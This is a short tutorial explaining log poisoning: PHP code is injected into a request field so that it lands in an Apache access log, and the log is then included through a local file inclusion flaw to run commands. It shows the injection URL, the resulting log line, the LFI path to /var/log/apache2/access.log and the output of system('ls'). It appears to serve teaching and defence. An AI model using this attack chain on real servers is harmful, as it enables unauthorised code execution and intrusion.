**Log Poisoning** is a specific type of attack where an attacker injects malicious code into server log files. These log files could be accessible and included in the application, leading to the execution of the malicious code. The attacker typically exploits LFI by targeting log files that are later included or parsed by the server.

## Example of Log Poisoning
- Send a malicious request to inject PHP into a user field, such as `username`:
```bash
http://example.com/login.php?username=<?php system('ls'); ?>
``` 
- This request is saved in the log file as:
```csharp
127.0.0.1 - - [10/Apr/2025:14:32:59 +0000] "GET /login.php?username=<?php system('ls'); ?>" 200 1024
``` 


## Remote Code Execution (RCE) via LFI and Log Poisoning

Once the attacker has injected code into the log, they can exploit it through the LFI vulnerability. If the log is included without filtering, the PHP code within the log will execute on the server.

#### Step-by-step Attack:

1. **Injection into Logs**
Inject PHP into the `username` field:
  ```
  http://example.com/login.php?username=<?php system('ls'); ?>
  ```
The server saves this request in the log.

2. **Include the Log via LFI**
The attacker uses the LFI vulnerability to include the log file with the following URL:
  ```
  http://example.com/index.php?page=/var/log/apache2/access.log
  ```
If the server processes the log file as PHP, the code injected into the log will execute.

3. **Command Execution**
The injected PHP command executes and returns the result:
  ```
  bin  etc  home  var  root
  ```
This is the result of `system('ls')` executed on the server, indicating that **RCE** has been achieved.
